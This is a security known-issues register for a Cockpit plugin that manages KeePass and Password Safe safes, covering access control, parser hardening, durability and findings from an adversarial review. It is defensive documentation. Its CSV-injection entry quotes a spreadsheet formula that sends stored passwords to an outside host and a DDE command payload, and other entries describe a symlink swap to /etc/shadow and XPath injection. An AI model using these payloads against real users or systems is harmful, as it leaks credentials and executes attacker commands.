# Known issues register — cockpit-secrets

Every hazard identified for a Cockpit plugin that unlocks and fully manages KeePass (KDBX)
and Password Safe v3 safes, with severity, root cause, the mitigation that closes it, and the
task that owns it. Tasks cite these ids; a task is not done until its cited ids are either
MITIGATED or explicitly re-classified with a reason.

Legend — Sev: **C**ritical / **H**igh / **M**edium / **L**ow.
Status: OPEN / MITIGATED / BY-DESIGN / WONTFIX.

---

## Access control and identity

### I1 · A safe is a file, and files have no notion of "user safe" vs "admin safe" · Sev C · OPEN→(design closes)
Nothing in KDBX or PWS3 records who may open it. Access class is **our** concept and must be
imposed from outside the file, or it does not exist. **Mitigation:** a root-owned registry,
`/etc/cockpit-secrets/safes.d/*.json` (0644 root:root, directory 0755 root:root), is the only
source of safes. Each entry declares `access: "admin" | "user"`. **A registry entry with no
`access` key is `admin`** — the default is the restrictive one, and an unparseable entry is
dropped with a logged error rather than defaulted open. Owner: Task 2.

### I2 · Two access classes need two privilege levels, not one · Sev H · MITIGATED (proved as a pair, live)
Running everything as root makes every user safe a root-readable file and every bug a root
bug. **Mitigation:** one helper binary, two invocations. `access:"user"` safes are handled by
`cockpit.spawn([...])` with **no** superuser option — the helper runs as the logged-on user
under their own bridge, and can only reach files that user could already read. `access:"admin"`
safes require `cockpit.spawn([...], {superuser:"require"})`; the helper refuses the verb unless
`os.geteuid() == 0`. Least privilege per safe, not per plugin. Owner: Task 2.

**Status after the 2026-09-04 re-gate: proved as a PAIR under a real bridge.**
`docs/COMPATIBILITY.md` §8 used to carry a row reading *"`superuser: "require"` under a real
Cockpit bridge — no test has ever run against a real bridge."* That is out of date and has been
corrected. `tests/browser/live-access.spec.js` item 9 runs against live Cockpit 360 signed in as
a real account, and both directions hold: with administrative access OFF, an admin-class safe is
refused immediately by the bridge and **no prompt is drawn anywhere**; after Cockpit's OWN header
control grants it, the same safe opens through the page and renders 6 rows out of a root-owned
file the account cannot read unescalated. 22/22 checks, run twice from a reset state. The
refusal alone would prove nothing; the pair is the evidence.

### I3 · A browser-side access check is cosmetic · Sev C · MITIGATED (driven from devtools, live)
Verified in a sibling project: cockpit-guac-rdp `I4` shipped an `if (t.admin && !isAdmin)` in
JS and it was bypassable by driving the backend directly. **Mitigation:** the UI may *hide*
what a user cannot use, but every verb re-derives the caller's identity and re-checks the
class server-side. The test suite drives the helper directly as a non-admin and asserts
refusal. Owner: Task 2, Task 9.

**Status after the adversarial review and the 2026-09-04 re-gate: MITIGATED, three ways.**
(1) All 33 verbs were driven directly as `cptest` (uid 1005, not in `sudo`) against a real
admin-class safe, through `runuser -u cptest` from a root job so the kernel identity was
genuinely 1005 — every safe-operating verb answered `access-denied`, and the file was never
opened, so no header, KDF, iteration count or format fact leaked either. (2) The same refusal
holds for autosave mutations carrying the CORRECT passphrase, which proves `gate()` runs before
the KDF and not after. (3) `tests/browser/live-access.spec.js` item 8 reproduces it in the live
page **and from devtools**, driving the helper directly past the UI — 22/22 with item 9, twice.
The positive control that makes those refusals meaningful is in the same run: `cptest` opening a
user-class safe it genuinely owns succeeds.

### I4 · Client-supplied paths · Sev C · OPEN→(design closes)
If the browser can name the file to open, "user" access is meaningless — ask for
`/etc/cockpit-secrets/safes/root.kdbx` and see what happens. **Mitigation:** verbs take a
**registry id**, never a path. Path resolution happens only inside the helper, from the
registry. There is no verb that opens an arbitrary path. Owner: Task 2.

### I5 · Symlink and TOCTOU attacks on safe files · Sev H · OPEN→(design closes)
A `user` safe lives under a path the user controls, so they can swap it for a symlink to
`/etc/shadow` between the check and the open — and a root-mode helper would follow it.
**Mitigation:** open with `O_NOFOLLOW|O_CLOEXEC`, `fstat` the **fd** (never re-`stat` the
path), verify `st_uid` against the expected owner, reject anything not a regular file, reject
group/other-writable parents, and do every subsequent operation on that same fd. Owner: Task 2.

---

## Cryptography and file parsing

### I6 · Verify-before-use, and constant-time comparison · Sev C · OPEN→(design closes)
PWS3 puts its HMAC at the **end** of the file, so the format forces decrypt-then-authenticate;
KDBX4 authenticates per block but the inner XML is still attacker-shaped until the MAC checks
out. Returning any value before the MAC verifies turns a parser bug into a decryption oracle.
**Mitigation:** parse into memory, verify the MAC, and only then let a value escape the
backend adapter. All MAC and hash comparisons use `hmac.compare_digest`. A wrong password and
a corrupt file produce the **same** error taxonomy to the client, with the distinction only in
the audit log. Owner: Task 3, Task 4.

### I7 · KDF parameters are attacker-controlled · Sev H · OPEN→(design closes)
KDBX carries its Argon2 `m`/`t`/`p` in the header; PWS3 carries `ITER`. A hostile file can
demand 4 GiB of memory or 10^9 iterations and take the helper — and on the admin path, root —
with it. **Mitigation:** clamp before the KDF runs. Reject Argon2 `m` > 1 GiB, `t` > 32,
`p` > 8; reject PWS3 `ITER` outside [2048, 8388608] and **write** at the format's current
floor of 262144. Enforce an overall wall-clock and RSS budget on the derivation. Owner: Task 3, Task 4.

### I8 · XXE / entity expansion in the decrypted KDBX inner XML · Sev H · OPEN→(design closes)
KDBX4's payload is XML, parsed here by `lxml`. Entities and DTDs are a billion-laughs and
file-disclosure vector even though the XML is "ours" — it is only ours *after* it verifies.
**Mitigation:** construct the parser explicitly with `resolve_entities=False`,
`no_network=True`, `load_dtd=False`, `huge_tree=False`, and cap the decompressed inner size.
Assert it in a unit test with a hostile fixture — do not rely on a library default that can
change. Owner: Task 3.

### I9 · CSP weakening for in-browser crypto · Sev H · BY-DESIGN (avoided)
Doing Argon2 in the browser needs WASM, which needs `wasm-unsafe-eval` in the package
manifest CSP — a weaker policy on the one page that handles every password we own.
**Mitigation:** no browser-side crypto at all. The manifest adds **no** CSP relaxation; the
plugin must run clean under Cockpit's default `default-src 'self'`, which also means no inline
`<style>`/`<script>` and no `eval`. A test asserts the manifest contains no
`content-security-policy` key. Owner: Task 5.

### I10 · Secret material on argv / in the environment / in temp files · Sev C · OPEN→(design closes)
`/proc/<pid>/cmdline` and `/proc/<pid>/environ` are readable by the process owner and by root,
and argv reaches shell history and audit trails. **Mitigation:** the master password, key-file
contents and every decrypted value travel **only** on the helper's stdin/stdout as JSON frames.
No verb accepts a secret as an argument. No secret is ever written to a temp file. A test
reads `/proc/<pid>/cmdline` and `/proc/<pid>/environ` of a live helper mid-unlock and asserts
the passphrase is absent. Owner: Task 2, Task 8.

### I11 · Browser-side persistence of the master password · Sev C · OPEN→(design closes)
`localStorage` and `sessionStorage` are origin-wide and survive navigation; anything stored
there is readable by any XSS anywhere in Cockpit. **Mitigation:** the password lives in one
function-scoped JS variable, is sent, and is overwritten. No storage API, no `IndexedDB`, no
cookie, no `autocomplete` on the field, no hidden form. A Playwright test asserts both storage
areas are empty after an unlock. Owner: Task 5, Task 8.

---

## Data integrity

### I12 · In-place writes destroy safes · Sev C · OPEN→(design closes)
A crash, a full disk, or a killed helper part-way through a save leaves a truncated database
and no undo — the worst possible outcome for this program. **Mitigation:** write to
`<safe>.tmp-<pid>` in the same directory, `fsync` the file, `os.replace`, then `fsync` the
directory. Take a timestamped backup into a retention ring **before** the first mutation of a
session. A test kills the helper with `SIGKILL` between write and rename and asserts the
original is intact. Owner: Task 6.

### I13 · Lost updates against a desktop client · Sev H · OPEN→(design closes)
KeePass/KeePassXC use `<name>.kdbx.lock`; Password Safe uses `.plk`. Ignoring them means a
save silently discards whatever the desktop app wrote. **Mitigation:** honour and create the
lock file for the duration of a write; additionally record `(mtime_ns, size, sha256)` at
unlock and re-check immediately before writing — on mismatch, refuse and surface a
"changed on disk" conflict, never merge silently. Owner: Task 6.

### I14 · Plaintext in process memory, swap, and core dumps · Sev H · PARTIAL (inherent)
Python `str` is immutable and interned: a password read into a `str` **cannot** be wiped, and
`gcore` on the helper would yield the whole decrypted safe. **Mitigation (defence in depth,
not a fix):** read secrets into `bytearray` and zero them in `finally`; set `RLIMIT_CORE=0`
and `prctl(PR_SET_DUMPABLE, 0)` at start-up; best-effort `mlockall(MCL_CURRENT|MCL_FUTURE)`
and log when it fails rather than pretending it worked; keep the helper's lifetime to a single
operation so the window is milliseconds, not hours. **Residual risk stated in the docs:** a
root-equivalent attacker on this host can read helper memory. That is true of every password
manager on every machine and is not solved here. Owner: Task 2, Task 9.

### I15 · Secrets in logs, errors and tracebacks · Sev H · OPEN→(design closes)
An unhandled exception prints locals; `wg-admin`'s header already warns that this host's job
logs are group-readable. **Mitigation:** a single top-level exception barrier that emits
`{"error": "<class>: <safe message>"}` and never a traceback to stdout; an audit log that
records *verb, safe id, caller uid, outcome* and never a value; a redaction filter applied to
everything the helper writes; and `set -x` explicitly banned in any shell wrapper. Owner: Task 2.

### I16 · Unbounded unlock attempts · Sev M · PARTIAL (two halves proved, two defects found)
An unlock endpoint that never says no is an offline-strength guessing oracle with the KDF's
cost as the only brake. **Mitigation:** per-(uid, safe id) failure counter in a root-owned
state file with exponential backoff and a lockout threshold, plus a constant floor on the
failure path so a wrong password does not answer faster than a right one. Owner: Task 2.

**Status after the adversarial review and the 2026-09-04 re-gate.** The two halves of this
hazard came out differently and the entry now says so rather than averaging them.

* **The constant floor holds, and is measured.** 200 samples each way against one safe with the
  real 0.75 s floor: wrong `min 1.0249 / med 1.0525 / max 1.0946`, correct
  `min 0.7681 / med 0.8265 / max 0.8743`. Fully separated in the direction this hazard requires
  — `correct.max < wrong.min` — and two *different* wrong passphrases are indistinguishable, so
  there is no per-guess signal. The floor is on every credential-bearing verb, not only
  `unlock`, because they all route through `need_backend → do_unlock`. It also cannot be
  starved: it is `time.monotonic()` plus one `sleep`, so load only lengthens it.
* **The counter does not hold.** It is a lost-update race (**I39**) and, on the admin path, it
  is keyed on euid so every administrator shares one counter per safe (**I40**). Both were
  reproduced on 2026-09-04. Until those are fixed, the honest statement of this mitigation is
  *"a constant-time floor, plus a counter that works when attempts arrive one at a time."*

The sentence "per-**(uid, safe id)**" in the mitigation above is what the code was supposed to
do and is not what it does; see I40.

### I17 · Clipboard leakage · Sev M · OPEN→(design closes)
A copied password stays in the clipboard indefinitely and any focused page can read it.
**Mitigation:** copy through `navigator.clipboard` on an explicit user gesture only, with a
visible countdown and automatic clear (default 15 s), and clear on page hide/unload. Document
honestly that the clipboard is a shared OS resource and clearing is best-effort. Owner: Task 5.

### I18 · An unlock agent is a permanently unlocked safe · Sev H · MITIGATED (two residuals named)
"Do not prompt every time" is exactly the property we are trying not to have. **Mitigation:**
the agent is **off by default** and must be enabled per-safe in the registry. When on: an
`AF_UNIX` socket in a 0700 per-user run dir, peer identity from `SO_PEERCRED`, a handle bound
to the uid that created it, a **hard** idle timeout (default 300 s) and absolute lifetime
(default 3600 s), automatic lock on screen-lock/logout, and a visible "unlocked, N s left"
banner. Prompting stays the default for every safe that does not opt out. Owner: Task 7.

**Status after the second build.** The agent ships, and `tests/integration/agent_cycle.py`
drives the real helper against the real daemon: agent off is proved to create no socket and
leave no state; agent on is proved to take a ticket, be visible to a SECOND helper process, be
revoked by `lock` with a bare safe id, and expire on its own deadline.

The mitigation went further than the design asked in one way and stops short in two others,
and all three are deliberate:

* **The agent holds a TICKET, not key material.** `secrets-admin` sends no `material` and the
  daemon's `put` makes it optional. So the agent cannot hand a later helper an unlocked safe,
  and the passphrase is still prompted on EVERY unlock — the agent buys visibility and
  revocation, not "do not ask me again". The material path exists and is tested because this
  hazard sanctions it as a per-safe opt-in, but nothing in the tree uses it and the helper
  strips a `material` key out of any reply at the door. docs/CONTRACT.md, "What the agent
  holds", is the authority.
* **RESIDUAL — the lock detection is a 10 s poll**, not a subscription to logind's `Lock`
  signal, so there is up to one poll interval between the screen locking and the ticket being
  dropped. Suspend is handled two other ways that are not polls: the deadlines run on
  `CLOCK_BOOTTIME` so they count suspended time, and a tick gap larger than tick+30 s drops
  everything.
* **RESIDUAL — the admin class separates operators by INSTANCE, not by peercred.** For an
  `access:"admin"` safe the helper is root, so `SO_PEERCRED` reports uid 0 for every operator.
  The separation is one agent per operator behind a 0700 run dir (`secrets-agent@<uid>`), which
  `install.sh` installs and deliberately does not enable. The correct fix is for the root
  helper to fork and setuid to the operator before connecting; that is not implemented.

### I19 · "Compliant" is a claim, not a test result · Sev H · OPEN→(design closes)
A reader and a writer that share a bug round-trip perfectly and interoperate with nothing.
**Mitigation:** compliance is measured **only** against foreign implementations — files we
write must open in `keepassxc-cli`, files it writes must open in ours, plus the published
Twofish/format test vectors and a committed real-`pwsafe`-GUI fixture for PWS3. Where an
oracle is unavailable (no packaged PWS3 CLI on this host), the docs say so instead of
implying coverage we do not have. Owner: Task 8, Task 9.

### I20 · KDBX3 has no authenticated encryption · Sev M · OPEN→(design closes)
KDBX 3.1 predates the KDBX4 HMAC block scheme: a tampered file decrypts to attacker-influenced
XML with nothing to detect it. **Mitigation:** open KDBX3 read-only, show a persistent banner
naming the risk, and offer an explicit operator-confirmed "upgrade to KDBX4" that writes a new
file rather than converting in place. Never upgrade silently. Owner: Task 3, Task 6.

### I21 · Attachment and export paths are an exfiltration channel · Sev M · OPEN→(design closes)
"Export database as CSV/XML" writes every secret in plaintext to disk, and an attachment
export names a destination path. **Mitigation:** exports are an `admin`-only verb, off unless
enabled in the registry, always written `0600` to an operator-configured directory (never a
client-supplied path), always audited by name, and always preceded by an explicit confirm
naming what is about to be written in the clear. Attachment downloads stream through the
Cockpit channel to the browser rather than landing on the server's disk. Owner: Task 6, Task 7.

**Status after the second build: MITIGATED, and proved as a pair.** `export` is refused for a
user-class safe even when the caller owns the file, refused when `export_allowed` is false,
refused without the per-safe confirm token `export-plaintext:<id>`, refused for a confirm
naming a DIFFERENT safe, and refused for an unknown `fmt` — and the SAME request then succeeds
inside `unshare --map-root-user`, where `os.geteuid()` really is 0. A refusal on its own proves
nothing; the pair is the evidence. Measured in `tests/integration/newverbs.py`: the file lands
0600 in a 0700 directory under `export_dir`, named `<safe id>-<UTC stamp>.<ext>` minted
helper-side, the content is absent from the response, and the audit line carries the file name
and the row count and no value. `validate.sh` additionally pins the one call site that creates
an export to `export_dir_for(entry)`, so a destination from the request cannot reappear as a
one-line change.

The sibling hazard — a page that phones out about the passwords it holds — is closed the same
way: `breach-check` reads an operator-supplied local corpus and there is no online fallback.
`validate.sh` bans every network-capable name from the helper, the backends and the agent, and
the verb is measured answering correctly inside a network namespace whose only interface is a
DOWN loopback, with a control proving that namespace really is deaf.

### I22 · Silent format/feature loss on save · Sev M · OPEN→(design closes)
Reading a KDBX4.1 database with a library that does not model every field and writing it back
**deletes** what it did not understand — custom icons, previous-parent-group, quality flags,
plugin data. **Mitigation:** before the first write to a safe, diff a parse→serialize→parse
round trip and refuse to save if any field would be dropped, naming the field. Prefer refusing
to save over quietly amputating a database. Owner: Task 3, Task 6.

---

## Found by adversarial review, after v0.2.0 shipped every gate green

Everything above was found by the people who built this. The twelve entries below were not:
they came from six adversarial lenses attacking a build whose own tests were 16/16, whose
`validate.sh` was 15/15, whose live browser walkthrough was 140/140 and whose root-side
verification was 233/233 — and from an independent skeptic who then tried to kill each finding
and could not. **A reader and a writer that share a bug agree perfectly** is I19's sentence
about file formats; these are what it looks like applied to a test suite.

Each entry names the guard that now fails if the defect returns. Those guards live in
`tests/test_regressions.py` (run by `validate.sh` on every gate),
`tests/integration/adversarial.py` (run by `run_tests.sh`), and five new standing bans in
`validate.sh`. Every one of them was watched to fail with its fix reverted.

### I23 · A compression RATIO cannot tell a bomb from a log file · Sev H · MITIGATED
`_bounded_decompress` refused any inner payload expanding more than
`Limits.MAX_DECOMPRESS_RATIO` (200:1) above a 1 MiB floor. DEFLATE's physical maximum is
1032:1 — measured 1028:1 on this host for every size from 1 MiB to 256 MiB — so the threshold
did not separate a bomb from ordinary compressible content; it only decided how compressible a
legitimate attachment was allowed to be.

It decided wrong, in both directions. **Write side:** `attach_add` of an ordinary 8 MiB log
file (well inside `Limits.MAX_ATTACHMENT_BYTES`) produced a 33 KB database, `save()` answered
`{"ok": true}`, and every later `unlock` answered `invalid: compressed payload expansion ratio
258:1 is over the 200:1 limit` — while KeePassXC read the same file perfectly. Reachable with
no adversary at all (A7), and through the helper's own transport: the ratio is computed over
the whole inner payload, so it accumulates across frames, and four `attach-add` frames each
under the ~760 KiB transport ceiling did it. **Read side:** valid KDBX 3.1 databases written by
`keepassxc-cli`, whose attachments are gzipped individually in the binary pool, were refused at
`fields`, `attach_list`, `attach_get` and `export_plain` — and `_attachment_bytes(strict=False)`,
documented as the tolerant listing path, caught only four builtin exception types, so the
`Invalid` flew straight out and took the entry's every other field with it.

**Mitigation, in three parts, because the ratio was standing in for controls that were
missing.** (1) The bomb defence is the ABSOLUTE cap, enforced incrementally by
`decompressobj().decompress(data, max_length)` — memory never exceeds `MAX_INNER_BYTES`
whatever the ratio, so "expands until the allocator gives up" is impossible by construction
rather than by threshold. (2) New STRUCTURAL caps in `_reject_hostile_xml`, applied in the same
walk that already rejects DTDs and entity references: a `<String><Value>` over
`MAX_FIELD_BYTES`, a pooled `<Binary>` over `MAX_ATTACHMENT_BYTES` (measured as base64, so a
legal attachment is not refused a third under the limit), more than `MAX_ENTRIES` entries or
`MAX_GROUPS` groups. These describe what the content IS, which a ratio never could — they
refuse the corpus's 64 MiB single-value bomb and admit a 32 MiB attachment, and those two are
byte-identical to a ratio test. The write path already enforced `MAX_FIELD_BYTES` in
`_check_text`, so the read and write limits are now the same number and **this program cannot
write a file its own reader refuses**. (3) `Limits.parse_budget()` bounds the wall clock of
everything downstream — see I25. The ratio check is kept, raised above `_DEFLATE_MAX_RATIO`,
and its comment now says plainly that it is a corruption check and not a security control.
`_attachment_bytes(strict=False)` tolerates `SecretsError` as well as the four builtins.

Guards: `test_crypto01_ordinary_compressible_payload_is_not_a_bomb`,
`test_crypto01_attach_then_save_then_reopen`,
`test_crypto01_tolerant_attachment_path_tolerates_invalid`,
`test_input1_oversize_field_value_is_refused_structurally`,
`test_input1_attachment_text_gets_the_attachment_limit`. The corpus cases
`kdbx41-compression-bomb-ratio` and `-size` are still refused as `invalid`, in 0.35 s and
0.92 s against a 15 s budget.

### I24 · A save that writes a database the reader cannot open · Sev H · MITIGATED
The other half of I23, and the one that generalises. `save()`'s only pre-write check was
`_verify_own_output`, which re-ran the header hash and the per-block HMACs — neither of which
decompresses or parses, so every refusal living downstream of them was invisible to it. The
round-trip guard that would have caught it, `_assert_lossless` (I22), latches
`self._lossless = True` on its first run inside `_mutable()` and short-circuits on every later
call, so a mutation made AFTER that first check was never round-tripped.

**Mitigation:** `_verify_own_output` now re-opens the bytes it is about to write through the
SAME reader path a later `unlock` uses — `_bounded_decompress`, the hardened XML parser, the
structural caps, the protected-value pass — and runs `_diff_xml` against the tree being
serialised, on EVERY save. A refusal is a `Conflict` that names what the reader objected to,
and the live file is untouched. The cost is one symmetric decrypt and one parse per save, with
no KDF; a save is not a hot path and the alternative is a safe that is gone.

**CORRECTION, 2026-09-04.** The paragraph above originally ended with the sentence *"This also
closes the latent half of the same latch on the PWS3 side, where `_ensure_lossless` runs the I22
check once per session rather than once per save."* **That sentence was false and has been
removed.** `_verify_own_output` exists only in `backends/kdbx.py`; `backends/psafe3.py`'s
`save()` calls `_ensure_lossless()` and nothing else, and `_lossless_checked` still latches. The
PWS3 half was reproduced during the re-gate and is now **I41**, OPEN. This entry stands as
MITIGATED **for KDBX only**, which is what its guard actually tests.

Guard: `test_crypto01_save_refuses_output_it_cannot_read_back`, which makes the reader stricter
than the writer for the duration of one save and asserts both the refusal and that the live
file is byte-for-byte unchanged. Note that it is a KDBX test; there is no PWS3 equivalent,
which is why the false claim survived review.

### I25 · No wall-clock bound on turning a payload into a database · Sev M · MITIGATED
`Limits.MAX_ENTRIES` says it "stops a file that claims 10^9 records and makes the helper build
the list before anything notices", but it was checked in `unlock()` AFTER
`PyKeePass(io.BytesIO(data), ...)` had parsed the payload and run its protected-value pass —
the expensive part, and the part whose size an attacker chooses. pykeepass evaluates
`tree.getpath(elem)` (O(position)) once per `Protected="True"` value that fails to decode, so
N such values cost O(N squared). Measured: a 3.8 MB KDBX4 file carrying exactly `MAX_ENTRIES`
such entries spent 46 s at 100% CPU and 313 MB of RSS inside the constructor **and was then
accepted**. Nothing wrapped that stretch: `kdf_budget` and `RLIMIT_AS` cover only `_derive`, and
`harden_process` sets no `RLIMIT_CPU`. On an `access:"admin"` safe the burnt core and the burnt
memory are root's. In scope for A3, and the committed corpus already asserts a 15 s budget for
MAC-valid hostile inner XML — the entry/protected-value COUNT dimension was the one it missed.

**Mitigation, two parts.** The count clamps moved INTO the parse (I23 part 2), so `MAX_ENTRIES`
now means what its docstring claims. And `Limits.parse_budget()` wraps the constructor: unlike
`kdf_budget`, which can only detect a C call's overrun after the fact, this one arms
`setitimer(ITIMER_REAL)` and raises out of the Python-level loop where the quadratic lives. Its
exception derives from `BaseException`, not `Exception`, because it fires deep inside pykeepass
and construct and both have broad `except Exception` handlers that would otherwise swallow it
and carry on with a half-built tree. It degrades to after-the-fact detection when signals are
unavailable (not the main thread), and the result is discarded either way. The same file now
answers `invalid: opening this database exceeded its 20.0s budget` at 20 s.

Guards: `test_input1_entry_count_is_refused_before_the_decode`,
`test_input1_group_count_is_refused_in_the_parse`,
`test_input1_parse_budget_stops_a_python_loop` (bounded, so a lost preemption fails rather than
hangs).

### I26 · A short write makes a truncated backup generation · Sev H · MITIGATED
`write(2)` may write fewer bytes than it was given. `_ring_backup`'s copy loop was
`os.write(bfd, chunk); off += len(chunk)` — it advanced by the bytes READ. Every other
data-carrying write in the program looped on the return value correctly, which is exactly why
nothing caught the one that did not. Measured on a 256 KiB tmpfs: a 4661-byte safe produced a
4096-byte "generation" that was `fsync`'d, named, listed by the `backups` verb with a plausible
size and timestamp, and accepted by `restore-backup` — which wrote it over the live safe, after
which the safe did not open. Worse, some of those saves returned `"saved": true`, so the
operator was never told. The backup ring is the only undo this program has (I12 names "a full
disk" as the exact hazard it exists to mitigate), and on the ENOSPC path the poisoned
generations also counted toward `keep`, pruning real history out from under themselves.

**Mitigation:** `backends/base.py write_all()` is now the only place in the program that calls
`os.write()`, and `validate.sh` COUNTS rather than describes — `tests/ban_os_write.py` parses
each file and requires exactly one `os.write` call node, inside `write_all`. `base.py` is
deliberately NOT exempt: a first version of that ban exempted it and passed with the bug put
back. A generation is additionally re-`fstat`ed after `fsync` and unlinked if it is short, so a
ring member is either complete or absent, the temp file in `atomic_replace` gets the same
assertion, and an `OSError` on the ring is reported as `the backup generation could not be
written: ENOSPC` rather than `internal / OSError`.

Guards: `test_durability1_write_all_loops_on_a_short_write`,
`test_durability1_a_short_backup_write_is_refused_and_removed`, and the DURABILITY-1 section of
`tests/integration/adversarial.py`, which injects one short write on the `.bak` fd through a
`sitecustomize` on `PYTHONPATH` and asserts the generation is the whole file.

### I27 · `restore-backup` installed a generation it had not checked · Sev L · MITIGATED
`_read_backup` bounded a generation from below only by "not empty", then checked four bytes of
format magic — and the comment above `_SAFE_MAGIC` claimed that "does prove it is not a
truncated file". A prefix of a real database keeps its magic, so a truncated generation (I26,
an interrupted `cp`, any partial write) passed and was written over the live safe. Full
verification is impossible by design here, because the verb deliberately takes no passphrase.

**Mitigation:** `Backend.verify_structure(data)` — a key-free, O(file) walk of the format's own
framing. KDBX4 is fully checkable: header hashes present, then the
`hmac(32) | length(u32) | bytes` block chain walked to its zero-length terminator, ending
exactly at end-of-file. KDBX 3.x has no block framing, so the strongest honest statement is
"the ciphertext is present and a whole number of cipher blocks", and the docstring says so
rather than implying more. PWS3's `_split_prefix` already was this check. The ABC's default
REFUSES rather than returning True, so a format that has not implemented it cannot read as
verified — and `_read_backup` looks the backend up through `load_backend_class`, not
`backend_for`, because the lazily-imported module would otherwise raise `Unsupported` and be
read as "no check exists". (That was found by the regression test, not by review.)

Guards: `test_durability4_*` (five), and the DURABILITY-4 section of `adversarial.py`.

### I28 · An orphan lock file wedged a safe permanently · Sev L · MITIGATED
`LockFile.acquire()` creates the lock `O_CREAT|O_EXCL` and then writes the payload. When that
write failed — a completely full filesystem is the case that happens — the exception left
`acquire()` from inside `__enter__`, so Python never called `__exit__` and nothing ever removed
the file. Measured: every later save answered `conflict / the safe is locked by an unnamed
process`, long after the disk was free, with `override_stale` as the only way out. That trains
the operator to force past lock files, and forcing past a REAL KeePassXC lock is precisely the
lost update I13 exists to prevent.

A sibling defect at the same call site: a DIRECTORY at the lock path made the safe un-savable
with **no** override at all. `_read_holder` called `os.read` on a descriptor `os.open` had
happily given it for a directory; the `IsADirectoryError` was raised INSIDE the
`except FileExistsError` handler, where the sibling `except OSError` of the same statement
cannot catch it, so it escaped as `internal / IsADirectoryError` before the `override_stale`
branch was ever consulted.

**Mitigation:** `acquire()` unlinks the lock it just created if the payload write fails, and
reports the errno class. `_read_holder` and `_holds_our_token` guard their reads separately from
their opens. A lock path that is not a regular file or a symlink is named as debris in a
`Conflict` — "remove it by hand, this is not something an override can clear" — which is true
and actionable, rather than sending the operator to close a client that is not running.

Guards: `test_durability2_a_failed_payload_write_leaves_no_lock`,
`test_durability5_a_directory_at_the_lock_path_is_a_conflict`, and
`test_durability5_an_ordinary_stale_lock_still_overrides` as the control.

### I29 · Duplicate field names resolved first-wins · Sev L · MITIGATED
`_field_element()` returned the first `<String>` whose `<Key>` matched, and `Pws3Db.field_get`
the first field of a given type. KeePassXC 2.7.10 REFUSES a KDBX with a repeated string key
outright ("Duplicate custom attribute found"), so a safe supplied by A3 displayed a password no
reference implementation would ever show. The write path was sharper: `edit` rewrote the first
copy and answered `{"changed": ["password"]}` while the second — the one another reader might
use — kept the old value. A credential rotation that silently did nothing.

The KDBX **header** parser already refuses a repeated field for exactly this reason ("a parser
differential waiting to happen … Refuse rather than pick", `backends/kdbx.py`). The rule simply
had not been applied one layer down.

**Mitigation:** it is now applied at the layer every read and write passes through.
`_field_element` refuses a repeat; `_assert_unique_fields` runs from `_entry()`, which every
uuid-addressed verb goes through, so the six core fields — which `edit` sets through pykeepass's
own property setters, deliberately, so that OTP and tag semantics stay pykeepass's — are covered
too. For PWS3, `Pws3Db._one()` is the single index lookup behind `field_get` / `field_set` /
`field_del`, so a read and a write cannot disagree about which copy is "the" field, and `unlock`
scans every record so the operator learns at open time. Only field types the format defines are
scanned: an unknown repeated type is data we preserve unchanged (I22), not a rule to invent.
0x11 repeats legitimately and is a HEADER field, reached through `header_get`, so it is
untouched.

One half of the original finding is NOT confirmed and is not claimed: that pwsafe's
`CItem::SetField` keeps the LAST occurrence. There is no pwsafe source or GUI on this host to
check it against (I19's standing gap for PWS3). The verified reference disagreement is the KDBX
one.

Guards: `test_crypto04_kdbx_*` (two), `test_crypto04_pws3_*` (two).

### I30 · `redact()` did not see what `json.dumps` had escaped · Sev L · MITIGATED
The blanket filter over `emit()` and `audit()` matches literal text, and both call it on the
OUTPUT of `json.dumps`. `_redaction_candidates` generated the raw value, its latin-1 reading,
`repr()` of each, base64 and hex — but not the JSON rendering, and those are different strings:
`repr()` switches to single quotes rather than escaping a double quote, and renders NUL as a
`\xNN` escape where JSON writes a `\uNNNN` one. So a passphrase containing `"` or NUL passed the
net untouched. The project's own self-check uses an alphanumeric sentinel, which is why 15/15
passed. The backslash case worked only by accident, because `repr` doubles it the same way JSON
does.

No live escape exists today and none is claimed: `scrub_listing` strips value-shaped keys from
every non-value-bearing verb, and `SecretsError` redacts its detail as a plain string BEFORE
`json.dumps`, where the filter works. This is a hole in the last line of defence, reachable only
through a coding mistake that has not been made — which is the whole point of a last line of
defence.

**Mitigation:** both JSON renderings (`ensure_ascii` False and True) are now candidates. The
`ensure_ascii=True` form also closes the `\uNNNN` case for every `json.dumps` in the program
other than `emit()`, which passes False for exactly that reason.

Guard: `test_leakage01_*`, over quote, NUL, backslash, plain and non-ASCII passphrases at both
`ensure_ascii` settings.

### I31 · A CSV export is an execution channel · Sev L · MITIGATED
`_export_csv` wrote every field with `csv.QUOTE_ALL` and nothing else. RFC 4180 quoting is not a
formula-injection defence (CWE-1236): Excel and LibreOffice hand a QUOTED cell beginning with
`=`, `+`, `-`, `@`, TAB or CR to the formula parser. An entry field under A3's control therefore
became a live formula in the one artefact that holds every credential in the safe at once —
`=WEBSERVICE("http://…"&D2&D3)` reads the neighbouring Password cells and sends them out.
Measured: a URL of `=cmd|' /C calc'!A0` was written to the export verbatim, quoted and otherwise
untouched.

**Mitigation:** `base.csv_cell()` prefixes such a cell with an apostrophe, and `base.CsvWriter`
applies it to every field of every row so a new export format cannot forget; `validate.sh` bans
a raw `csv.writer` outside `base.py`. The cost is real and is stated rather than hidden: there
is no neutralisation a plain CSV reader can undo unambiguously, so a legitimate value beginning
with one of those characters — a password like `-hunter2` is the realistic case — gains a
leading apostrophe. The `export` reply therefore reports `neutralised: N` and its warning
explains it, the change is visible in the file, and docs/COMPATIBILITY.md records the divergence
from KeePassXC's CSV, which does not neutralise either. Refusing to export such an entry was
considered and rejected: it turns a hostile safe into a denial of the operator's own recovery
path.

Guards: `test_leakage03_*` (four) and the LEAKAGE-03 section of `adversarial.py`, which drives a
real `export` at euid 0 and reads the bytes back off disk.

### I32 · Caller text still reached a pykeepass XPath · Sev L · MITIGATED
docs/COMPATIBILITY.md §7 records the XPath-injection defect in `Entry._get_string_field`, fixes
`reveal()` by comparing element text in Python, and then warns: *"Anyone else passing
caller-supplied text to a pykeepass find_* / set_custom_property call has the same bug."*
`KdbxBackend.add()` was that call site and was never hardened — `PyKeePass.add_entry` opens by
calling `find_entries(title=…, username=…)` unconditionally, before it even looks at
`force_creation`. Measured: an entry titled `a"b`, a perfectly legal KeePass title, answered
`{"error": "internal", "detail": "the KDBX engine could not open this database"}` — a verb the
caller cannot use, and a sentence that is not true, since the database was open. The same
character was legal through `edit` and fatal through `add`. No value is disclosed (the match
only decides whether to raise "already exists"), but it is an unhardened caller-text-into-XPath
site surviving in a shipping verb after the docs declared the class fixed, and that becomes a
read the next time a `find_*` result is used for something other than a duplicate check.

